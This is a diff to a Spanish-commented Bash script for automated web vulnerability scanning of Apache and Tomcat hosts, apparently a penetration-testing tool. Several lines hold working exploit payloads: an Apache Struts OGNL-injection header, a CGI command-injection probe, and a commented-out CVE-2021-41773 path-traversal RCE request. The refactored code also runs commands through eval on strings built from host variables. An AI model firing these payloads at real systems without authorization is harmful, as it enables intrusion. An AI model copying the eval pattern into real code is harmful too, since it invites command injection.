+        echo -e "\t\t[+] Revisando archivos graphQL ($host - Apache/nginx)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module graphQL -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_graphQL.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_graphQL.txt &
 
-	fi
+        # cve-2021-41773
+        #echo -e "\t\t[+] Revisando cve-2021-41773 (RCE)"
+        #command="$proxychains curl -k --max-time 10 $proto_http://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id'"
+        #echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt
+        #eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt 2>&1 &
+    fi
 
-
-	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then
+	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
 		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
 		greprc=$?
 		if [[ $greprc -eq 1 ]]; then
 
-			if [[  "$MODE" == "total" || ! -z "$URL" ]]; then
+			if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
 
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
-				echo "web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
+				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
 				sleep 1
 
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
 
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module backupApache -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backupApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &
 
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorApache -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &
 
-				echo -e "\t\t[+] multiviews check ($proto_http://$host:$port)  "
-				multiviews -url=$proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
+				echo -e "\t\t[+] multiviews check ($proto_http://$host:$port)"
+				command="multiviews -url=$proto_http://$host:$port/"
+				echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
 				grep vulnerable logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
-			fi  #total
+			fi #total
 
 			if [ "$EXTRATEST" == "oscp" ]; then
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module php -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module php -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt
+				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt &
 
 			fi #oscp
-		fi	#NO CMS
-	fi	#hosting domains
-
+		fi #NO CMS
+	fi #hosting domains
 
 	if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
 		waitWeb 0.3
 		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
-		echo "$proxychains  nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt 2>/dev/null
-		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt 2>/dev/null
+		command="$proxychains nmap --script http-slowloris-check -p $port $host"
+		echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt
+		eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt 2>/dev/null
 		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt
 	fi
 
 	if [ "$INTERNET" == "n" ]; then
 		waitWeb 0.3
 		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &
+		command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+		echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt
+		eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &
 
 	else
 		grep "is behind" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt 2>/dev/null
 		egrep -iq "is behind" .enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt
 		greprc=$?
-		if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app
+		if [[ $greprc -eq 1 ]]; then # si hay no hay firewall protegiendo la app
 			waitWeb 0.3
 			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
-			web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &
+			command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+			echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt
+			eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &
 		fi
 	fi
-
 }
 
 
-function enumeracionTomcat () {
-   proto_http=$1
-   host=$2
-   port=$3
+function enumeracionTomcat() {
+    proto_http=$1
+    host=$2
+    port=$3
 
-	#1: si no existe log
-   	if [[ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt" ]]; then
-		echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"
+    #1: si no existe log
+    if [[ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt" ]]; then
+        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"
 
-		$proxychains curl -k --max-time 10 "$proto_http":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt &
-		$proxychains curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null&
+        command="$proxychains curl -k --max-time 10 '$proto_http'://$host:$port/cgi/ism.bat?&dir"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
+        command="$proxychains curl -k --max-time 10 -H 'Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}' '$proto_http://$host:$port/'"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Nuclei tomcat $proto_http $host:$port"
-		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/tomcat_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module tomcat -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Nuclei tomcat $proto_http $host:$port"
+        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/tomcat_'$MODE'.txt -no-color -include-rr -debug"
+        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt 2>&1 &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module tomcat -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
 
-	fi
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
+    fi
 
+    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
+        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
+        greprc=$?
+        if [[ $greprc -eq 1 ]]; then
 
-	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then
-		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
-		greprc=$?
-		if [[ $greprc -eq 1 ]]; then
+            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
 
-			if [[  "$MODE" == "total" || ! -z "$URL" ]]; then
+                waitWeb 0.3
+                echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"
+                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
+                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
+                sleep 1
 
-				waitWeb 0.3
-				echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
-				sleep 1;
-
-				waitWeb 0.3
+                waitWeb 0.3
 				echo -e "\t\t[+] Revisando archivos por defecto ($host - Tomcat)"
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
+				command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt 
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
 
-				#iis_shortname_scanner
-				$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $host;exploit;exit" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_shortname.txt 2>/dev/null &
 			fi  #total
 
 			if [ "$EXTRATEST" == "oscp" ]; then
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando archivos jsp ($host - tomcat)"
-				web-buster -target $host -port $port -proto $proto_http -path $path_web -module jsp -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module jsp -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt
+				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt
 			fi #oscp
 		fi	#NO CMS
 	fi	#hosting domains
